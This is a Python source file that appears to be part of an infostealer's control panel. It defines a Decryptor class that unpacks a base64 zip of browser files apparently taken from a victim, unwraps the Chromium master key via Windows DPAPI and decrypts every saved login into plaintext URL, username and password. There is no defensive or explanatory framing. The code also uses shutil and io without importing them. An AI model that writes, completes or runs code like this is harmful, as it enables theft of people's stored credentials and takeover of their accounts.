# ui/decryption_util.py (NEW FILE)
import os
import json
import base64
import sqlite3
import zipfile
import tempfile
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

try:
    import win32crypt
    DPAPI_AVAILABLE = True
except ImportError:
    DPAPI_AVAILABLE = False

class Decryptor:
    def __init__(self, vault_data):
        self.vault_data = vault_data
        self.master_key = None
        self.temp_dir = tempfile.mkdtemp()

    def __del__(self):
        # Cleanup temp directory when object is destroyed
        if os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir, ignore_errors=True)

    def _extract_files(self):
        browser_files_module = self.vault_data.get("Browser Files", {})
        if not browser_files_module:
            return False, "Browser Files module not found in vault data."

        b64_zip_data = browser_files_module.get("data")
        if not isinstance(b64_zip_data, str):
            return False, "Browser file data is missing or not in the correct format."

        try:
            zip_bytes = base64.b64decode(b64_zip_data)
            with zipfile.ZipFile(io.BytesIO(zip_bytes), 'r') as zf:
                zf.extractall(self.temp_dir)
            return True, "Files extracted successfully."
        except Exception as e:
            return False, f"Failed to extract browser files from zip: {e}"

    def _get_master_key(self, browser_name):
        if not DPAPI_AVAILABLE:
            return None, "PyWin32 is not installed, cannot decrypt on this machine."
        
        local_state_path = os.path.join(self.temp_dir, f"{browser_name}_Local_State")
        if not os.path.exists(local_state_path):
            return None, f"Local State file for {browser_name} not found."
            
        try:
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            master_key = win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
            return master_key, None
        except Exception as e:
            return None, f"Failed to extract master key for {browser_name}: {e}"

    def _decrypt_value(self, encrypted_value, master_key):
        if not master_key: return "NO_MASTER_KEY"
        try:
            return AESGCM(master_key).decrypt(encrypted_value[3:15], encrypted_value[15:], None).decode()
        except Exception:
            return "DECRYPTION_FAILED"

    def decrypt_passwords(self):
        success, message = self._extract_files()
        if not success: return {"error": message}

        all_passwords = []
        browsers_found = list(set([f.split('_')[0] for f in os.listdir(self.temp_dir)]))

        for browser in browsers_found:
            master_key, error = self._get_master_key(browser)
            if error:
                all_passwords.append({"error": f"Could not get master key for {browser}: {error}"})
                continue
            
            login_db_path = os.path.join(self.temp_dir, f"{browser}_Login_Data")
            if not os.path.exists(login_db_path): continue

            try:
                conn = sqlite3.connect(login_db_path)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                for row in cursor.fetchall():
                    url, username, encrypted_pass = row
                    password = self._decrypt_value(encrypted_pass, master_key)
                    if password not in ["NO_MASTER_KEY", "DECRYPTION_FAILED", ""]:
                        all_passwords.append([browser, url, username, password])
                conn.close()
            except Exception as e:
                 all_passwords.append({"error": f"Failed to read password database for {browser}: {e}"})
        
        return all_passwords